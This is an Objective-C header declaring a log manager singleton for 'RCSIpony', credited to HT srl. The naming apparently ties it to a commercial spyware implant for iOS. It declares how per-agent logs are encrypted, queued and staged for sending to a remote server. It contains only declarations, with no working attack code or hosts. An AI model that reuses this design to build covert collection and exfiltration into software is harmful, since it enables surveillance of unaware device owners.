/*
 * RCSIpony - Log Manager
 *  Logging facilities, this class is a singleton which will be referenced
 *  by RCSMCommunicationManager and all the single agents providing ways for
 *  writing log data per agentID.
 *
 * 
 * Created by Alfredo 'revenge' Pesoli on 16/06/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#ifndef __RCSILogManager_h__
#define __RCSILogManager_h__

#import "RCSICommon.h"
#import "NSMutableData+AES128.h"


@class RCSIEncryption;

//
// Basically there are 2 possible queues:
// - Active, all the logs currently opened are stored here
// - Send, all the closed logs ready to be sent are stored here
// On Sync we close all the logs and switch them in the Send queue so that
// they can all be sent
// NOTE: The Switch operation is transparent for all the agents, they will just
//       keep calling writeDataToLog(), switchLogsBetweenQueues() will also recreate
//       a new empty log inside the kActiveQueue for all the agents that were there
//
enum {
  kActiveQueue = 2,
  kSendQueue   = 1,
};

//
// A Log Entry (NSMutableDictionary) contained in queues is composed of:
//  - agentID
//  - logID
//  - logName
//  - handle

@interface RCSILogManager : NSObject
{
@private
  NSMutableArray *mActiveQueue;
  
  NSMutableArray *mNoAutoQueuedLogs;
  NSMutableArray *mAutoQueuedLogs;
  
  NSMutableArray *mSendQueue;
  
  NSMutableArray *mLogMessageQueue;
  NSMachPort     *notificationPort;
  
@private
  RCSIEncryption *mEncryption;
}

@property (readonly) NSMachPort *notificationPort;

+ (RCSILogManager *)sharedInstance;
+ (id)allocWithZone: (NSZone *)aZone;
- (id)copyWithZone: (NSZone *)aZone;
- (id)init;
- (id)retain;
- (unsigned)retainCount;
- (void)release;
- (id)autorelease;

- (NSMutableArray*)getLogQueue: (u_int)agentID;

- (NSData *)createLogHeader: (u_int)agentID
                  timestamp: (int64_t)fileTime
                agentHeader: (NSData *)anAgentHeader;
                 
//
// @author
//  revenge
// @abstract
//  Main function used to create a log for the given agent.
//  Accepts logID in order to allow (1 Agent -> n logs)
//
- (BOOL)createLog: (u_int)agentID
      agentHeader: (NSData *)anAgentHeader
        withLogID: (u_int)logID;

- (BOOL)closeActiveLogsAndContinueLogging: (BOOL)continueLogging;

//
// @author
//  revenge
// @abstract
//  Close a single active log and move it to the mSendQueue
//
- (BOOL)closeActiveLog: (u_int)agentID
             withLogID: (u_int)logID;

//
// @author
//  revenge
// @abstract
//  Writes data to log referenced by anHandle
//
- (BOOL)writeDataToLog: (NSData *)aData forHandle: (NSFileHandle *)anHandle;

//
// @author
//  revenge
// @abstract
//  Writes data to log referenced by agentID + logID
//
- (BOOL)writeDataToLog: (NSMutableData *)aData 
              forAgent: (u_int)agentID
             withLogID: (u_int)logID;

//
// @author
//  revenge
// @abstract
//  Remove a single log from the mSendQueue
//
- (int)getSendLogItemCount;
- (id)getSendLogItemAtIndex:(int)theIndex;

- (BOOL)clearSendLogQueue: (NSMutableIndexSet *)theSet;

- (BOOL)addMessage: (NSData*)aMessage;

- (void)start;
@end

#endif